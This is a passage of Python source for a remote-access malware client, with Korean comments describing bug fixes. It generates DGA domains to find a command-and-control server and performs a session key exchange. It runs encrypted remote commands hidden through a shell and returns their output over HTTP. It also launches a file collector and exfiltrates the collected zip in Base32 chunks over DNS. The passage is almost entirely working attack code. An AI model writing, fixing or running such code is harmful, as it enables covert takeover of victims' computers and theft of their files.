    result_payload_str = result_bytes.decode('utf-8') if isinstance(result_bytes, bytes) else result_bytes

    # ================== [수정된 부분] ==================
    # 오류가 발생했던 'result_data'를 올바른 변수인 'result_payload_str'로 변경했습니다.
    payload = {"command": command_id_cmd_str, "result": result_payload_str}
    # ===============================================

    logging.info(f"API Result: Submitting result for '{command_id_cmd_str[:50]}...' via API to {result_url}")
    try:
        # verify=False는 이전 답변에서 수정한 내용이므로 그대로 유지합니다.
        response = requests.post(result_url, json=payload, timeout=15, verify=False)
        if response.status_code == 200 and response.json().get("status") == "success":
            logging.info(f"API Result: Successfully submitted result for command '{command_id_cmd_str[:50]}...'")
        else:
            logging.warning(f"API Result: Failed to submit result via API, Status: {response.status_code}, Resp: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        logging.error(f"API Result: Failed to submit result via API: {e}")


def api_c2_loop(victim_id_full, initial_c2_domain, session_id, current_session_key):
    """
    [Thread 1] API 채널을 담당하는 무한 루프.
    [수정] current_session_key를 인자로 받아 암/복호화에 사용합니다.
    """
    logging.info(f"[API Thread] Starting API C2 loop with domain: {initial_c2_domain}.")
    
    consecutive_failures = 0
    max_failures = 5
    current_c2_domain = initial_c2_domain

    while True:
        try:
            if not REQUESTS_AVAILABLE:
                logging.warning("[API Thread] 'requests' module not available. API C2 is disabled.")
                time.sleep(3600)
                continue

            api_commands_list_parsed = poll_server_for_commands_api(victim_id_full, session_id, current_c2_domain)
            
            if api_commands_list_parsed is not None:
                consecutive_failures = 0
                
                if api_commands_list_parsed:
                    for api_task in api_commands_list_parsed:
                        encrypted_cmd = api_task['cmd']
                        command_id_api = api_task['id']
                        
                        # [핵심 수정] 전달받은 세션 키로 명령을 복호화합니다.
                        command_to_run = decrypt_data(current_session_key, encrypted_cmd)
                        command_id_cmd_str_for_api_result = f"{command_id_api}|{encrypted_cmd}"

                        logging.info(f"[API Thread] Executing decrypted command (ID: {command_id_api}): '{command_to_run}'")
                        try:
                            api_process = subprocess.Popen(command_to_run, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='cp949', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0)
                            api_stdout, api_stderr = api_process.communicate(timeout=120)
                            output_for_api = (api_stdout or "") + (api_stderr or "")
                            if not output_for_api.strip(): output_for_api = "[no output]"
                            
                            # [핵심 수정] 전달받은 세션 키로 실행 결과를 암호화합니다.
                            encrypted_output_str = encrypt_data(current_session_key, output_for_api)
                            submit_command_result_api(victim_id_full, command_id_cmd_str_for_api_result, encrypted_output_str, current_c2_domain)
                        
                        except Exception as e_api_exec:
                            logging.error(f"[API Thread] Failed to execute command '{command_to_run}': {e_api_exec}")
                            error_output = f"[execution error: {str(e_api_exec)}]"
                            # [핵심 수정] 에러 메시지도 세션 키로 암호화합니다.
                            encrypted_error_output_str = encrypt_data(current_session_key, error_output)
                            submit_command_result_api(victim_id_full, command_id_cmd_str_for_api_result, encrypted_error_output_str, current_c2_domain)
                        
                        time.sleep(random.uniform(0.5, 1.5))
            else:
                consecutive_failures += 1
                logging.warning(f"[API Thread] API poll failed. Consecutive failures: {consecutive_failures}/{max_failures}")

            if consecutive_failures >= max_failures:
                logging.error(f"[API Thread] Max API failures reached for domain {current_c2_domain}. Terminating thread.")
                break

            time.sleep(POLLING_INTERVAL_API)

        except Exception as e:
            logging.error(f"[API Thread] An error occurred in the loop: {e}", exc_info=True)
            consecutive_failures += 1
            time.sleep(POLLING_INTERVAL_API * 2)


def dns_operations_handler(victim_id_full, c2_domain, session_id, current_session_key):
    """
    [수정] current_session_key를 인자로 받아 DNS 명령 처리 시 사용합니다.
    """
    CREATE_NO_WINDOW = 0x08000000
    DETACHED_PROCESS = 0x00000008

    logging.info("[DNS Thread] Starting DNS operations.")

    # --- 현재 로그인 사용자 이름 확인 ---
    try:
        cmd = [
            "powershell", "-Command",
            "(Get-CimInstance -ClassName Win32_ComputerSystem).UserName"
        ]
        output = subprocess.check_output(cmd, text=True).strip()
        if "\\" in output:
            username = output.split("\\")[-1]
        else:
            username = output
        local_app_data = f"C:\\Users\\{username}\\AppData\\Local"
    except Exception as e:
        logging.error(f"[DNS Thread] Failed to determine real user path: {e}")
        local_app_data = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local"

    aaa_dir_path     = os.path.join(local_app_data, "aaa")
    zip_path         = os.path.join(aaa_dir_path, "modified_files.zip")
    module2_exe_path = os.path.join(aaa_dir_path, "module2.exe")

    # --- 1. 조건부 파일 수집 및 유출 (생략 없이 전체 포함) ---
    # 참고: 현재 파일 유출(zip) 자체는 암호화 로직에서 제외되어 있습니다.
    # 이 부분은 Base32로 인코딩된 평문 데이터가 전송됩니다.
    if not os.path.exists(zip_path):
        logging.info(f"[DNS Thread] '{os.path.basename(zip_path)}' not found. Will try to execute file collector.")
        if not os.path.exists(module2_exe_path):
            logging.error(f"[DNS Thread] CRITICAL: Collector '{module2_exe_path}' not found. Cannot proceed.")
        else:
            try:
                logging.info(f"[DNS Thread] Launching '{module2_exe_path}' and waiting for it to complete...")
                proc = subprocess.Popen(
                    [module2_exe_path],
                    creationflags=CREATE_NO_WINDOW,
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                proc.wait(timeout=600) 
                logging.info(f"[DNS Thread] '{module2_exe_path}' has finished with return code {proc.returncode}.")
            except subprocess.TimeoutExpired:
                logging.error(f"[DNS Thread] '{module2_exe_path}' did not finish within the 600 second timeout.")
                proc.kill()
            except Exception as e:
                logging.error(f"[DNS Thread] Error during subprocess launch or wait: {e}")
    else:
        logging.info(f"[DNS Thread] Found existing '{os.path.basename(zip_path)}'. Attempting exfiltration.")

    if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
        try:
            logging.info(f"[DNS Thread] Starting exfiltration for '{zip_path}'. This may take a while.")
            with open(zip_path, "rb") as f:
                raw_zip_data = f.read()
            b32_zip_data_content = base64.b32encode(raw_zip_data).decode('utf-8').rstrip("=")

            file_content_hash = hashlib.sha256(raw_zip_data).hexdigest()
            exfil_session_id = file_content_hash[:12]
            logging.info(f"[DNS Thread] Generated stable exfil session ID: {exfil_session_id}")

            server_state = query_server_state(c2_domain, victim_id_full, exfil_session_id)
            start_chunk = server_state.get("last_chunk", -1) + 1
            if start_chunk > 0:
                logging.info(f"[DNS Thread] Resuming upload for session {exfil_session_id} from chunk {start_chunk}.")

            commands_from_exfil, sent_chunks, total_chunks = try_send_chunks(
                c2_domain, victim_id_full, b32_zip_data_content, start_chunk, exfil_session_id
            )

            if len(sent_chunks) == total_chunks and total_chunks > 0:
                logging.info(f"[DNS Thread] Exfiltration successful. Removing '{zip_path}'.")
                os.remove(zip_path)
            else:
                logging.warning(f"[DNS Thread] Exfiltration may be incomplete ({len(sent_chunks)}/{total_chunks} chunks confirmed).")

            if commands_from_exfil:
                for task in commands_from_exfil:
                    # 유출 중 받은 명령 실행
                    execute_command_and_send_results_dns(
                        task['cmd'], c2_domain, task['victim_id_full'],
                        task['session_id'], task['id'], current_session_key
                    )

        except Exception as e:
            logging.error(f"[DNS Thread] An error occurred during exfiltration: {e}", exc_info=True)
    else:
        logging.info("[DNS Thread] No file to exfiltrate.")

    # --- 2. DNS 명령어 폴링 루프 ---
    logging.info("[DNS Thread] Entering DNS command polling loop.")
    while True:
        try:
            dns_task = poll_commands_via_dns(c2_domain, victim_id_full, session_id)
            if dns_task:
                # [핵심 수정] execute_command_and_send_results_dns 호출 시
                # 암호화된 명령어(dns_task['cmd'])와 세션 키(current_session_key)를 전달합니다.
                execute_command_and_send_results_dns(
                    dns_task['cmd'], 
                    c2_domain,
                    victim_id_full, 
                    session_id, 
                    dns_task['id'],
                    current_session_key
                )
            time.sleep(DNS_CMD_POLL_INTERVAL)
        except Exception as e:
            logging.error(f"[DNS Thread] An error occurred in the DNS polling loop: {e}", exc_info=True)
            time.sleep(60)


# ==============================================================================
# 메인 실행 블록
# ==============================================================================
if __name__ == "__main__":
    logging.info(f"Client starting... Initial beacon delay for {INITIAL_BEACON_DELAY}s.")
    time.sleep(INITIAL_BEACON_DELAY)

    victim_id_full = get_victim_id_full()
    logging.info(f"[Main Thread] Victim ID established: {victim_id_full}")
    
    # C2 채널 재설정을 위한 메인 루프
    while True: 
        current_run_session_id = str(uuid.uuid4().hex)[:12]
        logging.info(f"[Main Thread] Current Run Session ID: {current_run_session_id}")
        
        active_c2_domain = None
        logging.info("[Main Thread] Attempting to resolve a new C2 domain...")
        
        dga_indices = list(range(MAX_DGA_ATTEMPTS))
        random.shuffle(dga_indices)
        dga_candidates = [dga(datetime.utcnow(), 1, i) for i in dga_indices]
        all_candidates = dga_candidates + [FIXED_DOMAIN]

        for domain_candidate in all_candidates:
            try:
                socket.gethostbyname(domain_candidate)
                logging.info(f"[OK] {domain_candidate} is alive, C2 domain set.")
                active_c2_domain = domain_candidate
                break
            except socket.gaierror:
                logging.info(f" -> {domain_candidate} ... [SKIP] NXDOMAIN")
            except Exception as e:
                logging.warning(f" -> {domain_candidate} ... [ERROR] {e}")
            time.sleep(random.uniform(0.1, 0.3))

        if not active_c2_domain:
            logging.error("[Main Thread] Could not resolve any C2 domain. Retrying after a long sleep (10 minutes).")
            time.sleep(600)
            continue
                
        logging.info(f"[Main Thread] Using C2 domain: {active_c2_domain}")

        # --- [핵심 수정] C2 스레드 시작 전 키 교환 수행 ---
        logging.info(f"Attempting to establish session key with C2 domain: {active_c2_domain}")
        key_exchange_successful = perform_key_exchange(active_c2_domain, victim_id_full)
        
        if not key_exchange_successful:
            logging.error("Failed to establish session key. Retrying C2 discovery after a delay.")
            time.sleep(60)
            continue # 키 교환 실패 시, 다시 C2 탐색부터 시작
        # ---------------------------------------------

        # --- [핵심 수정] 작업 스레드 생성 시 session_key 전달 ---
        logging.info("[Main Thread] Initialization complete. Starting C2 threads.")
        
        # API 통신 스레드
        api_thread = threading.Thread(
            target=api_c2_loop, 
            # args에 전역 변수 session_key 추가
            args=(victim_id_full, active_c2_domain, current_run_session_id, session_key), 
            daemon=True
        )

        # DNS 작업 스레드
        dns_thread = threading.Thread(
            target=dns_operations_handler, 
            # args에 전역 변수 session_key 추가 (다음 단계에서 이 함수를 수정할 예정)
            args=(victim_id_full, active_c2_domain, current_run_session_id, session_key), 
            daemon=True
        )
        
        api_thread.start()
        dns_thread.start()

        logging.info("[Main Thread] All threads started. Monitoring threads...")
        try:
            while api_thread.is_alive() and dns_thread.is_alive():
                time.sleep(1)
            
            logging.warning("[Main Thread] A C2 thread has finished. Restarting C2 discovery process.")
            
            api_thread.join(timeout=1)
            dns_thread.join(timeout=1)

        except KeyboardInterrupt:
            logging.info("[Main Thread] Shutdown signal (Ctrl+C) received. Exiting.")
            break
        
        reconnect_delay = 30
        logging.info(f"[Main Thread] Waiting for {reconnect_delay} seconds before retrying C2 discovery...")
        time.sleep(reconnect_delay)